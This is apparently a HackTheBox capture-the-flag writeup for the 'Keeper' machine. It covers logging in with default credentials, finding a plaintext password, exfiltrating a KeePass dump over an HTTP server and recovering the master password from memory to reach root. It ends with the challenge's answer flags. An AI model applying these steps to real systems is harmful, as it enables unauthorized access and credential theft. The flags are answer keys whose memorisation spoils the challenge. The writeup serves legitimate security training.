---
title: "Keeper"
date: 2023-12-27
tags:
  - HackTheBox
  - Writeup
  - Linux
  - Web
  - KeePass
sidebar:
  hide: true
---

[← Back to HackTheBox Writeups](/writeups/redteam/htb/)

# **Keeper**

![Keeper](https://live.staticflickr.com/65535/53503514962_9921579357_c.jpg)

<details>
<summary>ℹ️ Machine Information</summary>

**Machine**: [Keeper](https://app.hackthebox.com/machines/556)  
**Level**: `Easy`  
**Tags**: `Linux`, `Web`, `KeePass`  
**Pwn**: [Pwned by 0xrh0d4m1n](https://www.hackthebox.com/achievement/machine/1013077/556)

</details>

---

## 🚀 **Starting**

```bash
echo '10.10.11.227 keeper.htb' | sudo tee -a /etc/hosts
```

---

## 🔭 **Reconnaissance**

Starting with Nmap
```bash
sudo nmap -sV -sC -T4 -A -O -f -Pn --top-ports 1000 -oN top1k.nmap 10.10.11.227
```

Nmap results for the top 1000 most important ports
```log
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-27 12:23 EST
Nmap scan report for 10.10.11.227
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

A brief look into HTTP Headers
```bash
curl -X GET -Ik http://keeper.htb/
```
```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 27 Dec 2023 17:27:07 GMT
Content-Type: text/html
Content-Length: 149
```

In the browser we reached to this page  
<img src="https://live.staticflickr.com/65535/53505967308_9e4caed389_o.png" style="max-height:300px;" loading="lazy" alt="">

When clicked in the link from the previous page we get redirected to this `tickets` subdomain, which is presented to us by some tech named `RT v4.4.4`. After some research, I discovered that it is an application named "Request Tracker" used to manage Ticket Requests.  
<img src="https://live.staticflickr.com/65535/53506238490_662d91c33c_o.png" style="max-height:300px;" loading="lazy" alt="">

Since we are in a login page, we could try to search for some "default credentials". Most threads mention `root:password`.  
<img src="https://live.staticflickr.com/65535/53506238545_d2fe11a012_o.png" style="max-height:300px;" loading="lazy" alt="">

So, I tried the default credentials.  
<img src="https://live.staticflickr.com/65535/53505967328_5cebbaf4c2_o.png" style="max-height:300px;" loading="lazy" alt="">

And Voilà, we are in!  
<img src="https://live.staticflickr.com/65535/53505967318_24b7ec2a49_o.png" style="max-height:300px;" loading="lazy" alt="">

After a good time sniffing the application, I found this user list which has two users only: `lnorgaard@keeper.htb` and `root@localhost`.  
<img src="https://live.staticflickr.com/65535/53504930402_da2e61290f_o.png" style="max-height:300px;" loading="lazy" alt="">

When clicking into `lnorgaard` user, we can spot a very useful information on the comments — default password `Welcome2023!`.  
<img src="https://live.staticflickr.com/65535/53504930412_1439df69cf_o.png" style="max-height:300px;" loading="lazy" alt="">

Also, I found this interesting ticket.  
<img src="https://live.staticflickr.com/65535/53505815826_03a15fcd3b_o.png" style="max-height:300px;" loading="lazy" alt="">

Which had an invaluable information — a KeePass Dump file in the home directory of user `lnorgaard`.  
<img src="https://live.staticflickr.com/65535/53504930362_f80fe488cc_o.png" style="max-height:300px;" loading="lazy" alt="">

### **Initial Access**

> 💭 _Sometimes reconnaissance can be very impressive! A good recon saves you a lot of time!_

We know the user `lnorgaard` and the password `Welcome2023!`, let's try SSH access:
```bash
ssh lnorgaard@keeper.htb
lnorgaard@keeper:~$ ll
total 85380
-rw-r--r-- 1 root      root      87391651 Dec 27 19:50 RT30000.zip
-rw-r----- 1 root      lnorgaard       33 Dec 27 17:48 user.txt
```

### **User Flag**

What!? We just got the first flag! Easy peasy lemon squeezy! Thanks Recon ❤️

```bash
lnorgaard@keeper:~$ cat user.txt
# See flag codes at the bottom of the page
```

---

## 🪲 **Vulnerability Scan**

We know that this user has stored a KeePass Dump file into the home directory:
```bash
-rw-r--r-- 1 root      root      87391651 Dec 27 19:50 RT30000.zip
```

Let's exfiltrate this file:
```bash
lnorgaard@keeper:~$ python3 -m http.server 12345
```

```bash
wget http://10.10.11.227:12345/RT30000.zip
unzip RT30000.zip -d RT30000
cd RT30000
# KeePassDumpFull.dmp  passcodes.kdbx
```

---

## 🎯 **Exploit**

I found a tool to dump the KeePass master password from memory:  
<img src="https://live.staticflickr.com/65535/53505967333_d5724ce29d_o.png" style="max-height:300px;" loading="lazy" alt="">

```bash
git clone https://github.com/vdohney/keepass-password-dumper
keepass_pwd_dumper KeePassDumpFull.dmp
```

Output:
```
Password candidates (character positions):
1.:	●
2.:	ø, Ï, ,, l, `, -, ', ], §, A, I, :, =, _, c, M, 
3.:	d, 
...
Combined: ●{ø, Ï, ...}dgrød med fløde
```

After searching for `dgrød med fløde` on Google, the suggestion was `rødgrød med fløde` — a Danish dessert.

Using [KeeWeb](https://app.keeweb.info/) to open the `.kdbx` file with `rødgrød med fløde`:  
<img src="https://live.staticflickr.com/65535/53504930417_4f4cdc3024_o.png" style="max-height:300px;" loading="lazy" alt="">

Got a `root` password and a PuTTY key file. Exporting the key:
```bash
puttygen putty-private-key.ppk -O private-openssh -o putty-ssh-key.pem
ssh root@keeper.htb -i ./putty-ssh-key.pem
root@keeper:~# whoami
root
```

We are root!

---

## 🏁 **Flag Exfiltration**

```bash
root@keeper:~# cat /root/root.txt
# See flag codes below
```

<details>
<summary>🏁 Reveal Flags</summary>

#### **User Flag**
```
d3c5f430c7468430d3359cf169d84149
```
#### **Root Flag**
```
dd4a3509476abe6ef0cd0a35a79d14c3
```

</details>

---

_If this was helpful, [you can support me by zapping some sats](https://getalby.com/p/0xrh0d4m1n)!_  
_See you in the next writeup!_
